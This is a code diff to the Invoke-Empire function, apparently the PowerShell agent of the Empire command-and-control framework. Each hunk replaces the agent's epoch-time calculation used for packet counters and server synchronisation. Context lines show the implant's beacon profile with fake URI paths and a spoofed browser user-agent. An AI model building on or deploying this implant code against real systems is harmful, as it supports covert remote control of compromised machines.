@@ -71,7 +71,7 @@ function Invoke-Empire {
         $Profile = "/admin/get.php,/news.asp,/login/process.jsp|Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko",
 
         [Int32]
-        $Epoch = [math]::abs([Math]::Floor([decimal](Get-Date(Get-Date).ToUniversalTime()-uformat "%s"))),
+        $Epoch = [int][double]::Parse((Get-Date(Get-Date).ToUniversalTime()-UFormat %s)),
 
         [Int32]
         $LostLimit = 60,
@@ -146,7 +146,7 @@ function Invoke-Empire {
     $script:importedScript = ""
 
     # calculate the diff between the servers epoch and the agent's
-    $script:EpochDiff = $Epoch - [math]::abs([Math]::Floor([decimal](Get-Date(Get-Date).ToUniversalTime()-uformat "%s")))
+    $script:EpochDiff = $Epoch - [int][double]::Parse((Get-Date(Get-Date).ToUniversalTime()-UFormat %s))
 
 
     ############################################################
@@ -572,7 +572,7 @@ function Invoke-Empire {
         $packet = New-Object Byte[] (12 + $data.Length)
 
         # calculate the counter = epochDiff from server + current epoch
-        $counter = $($script:EpochDiff + [math]::abs([Math]::Floor([decimal](Get-Date(Get-Date).ToUniversalTime()-uformat "%s")))) -as [int]
+        $counter = $($script:EpochDiff + [int][double]::Parse((Get-Date(Get-Date).ToUniversalTime()-UFormat %s))) -as [int]
 
         ([bitconverter]::GetBytes($type)).CopyTo($packet, 0)
         ([bitconverter]::GetBytes($counter)).CopyTo($packet, 4)
@@ -862,7 +862,7 @@ function Invoke-Empire {
 
         # calculate what the server's epoch should be based on the epoch diff
         #   this is just done for the first packet in a queue
-        $ServerEpoch = [math]::abs([Math]::Floor([decimal](Get-Date(Get-Date).ToUniversalTime()-uformat "%s"))) - $script:EpochDiff
+        $ServerEpoch = [int][double]::Parse((Get-Date(Get-Date).ToUniversalTime()-UFormat %s)) - $script:EpochDiff
         # if the epoch counter isn't within a +/- 10 minute range (600 seconds)
         #   skip processing this packet
         if ($counter -lt ($ServerEpoch-600) -or $counter -gt ($ServerEpoch+600)){
